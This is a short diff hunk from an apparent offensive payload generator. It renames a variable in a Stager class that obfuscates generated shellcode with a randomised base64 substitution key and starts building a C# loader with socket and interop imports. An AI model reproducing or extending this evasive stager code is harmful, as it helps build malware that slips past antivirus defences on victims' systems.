@@ -34,11 +34,11 @@ class Stager:
 	def generate(self):
 		
 		self.shellcode = shellcode.Shellcode()
-		Shellcode = self.shellcode.generate()
+		shellcode = self.shellcode.generate()
 		
 		# the 'key' is a randomized alpha lookup table [a-zA-Z] used for substitution
 		key = ''.join(sorted(list(string.ascii_letters), key=lambda *args: random.random()))
-		base64payload = encryption.b64sub(Shellcode,key)
+		base64payload = encryption.b64sub(shellcode,key)
 		
 		payloadCode = "using System; using System.Net; using System.Text; using System.Linq; using System.Net.Sockets;" 
 		payloadCode += "using System.Collections.Generic; using System.Runtime.InteropServices;\n"
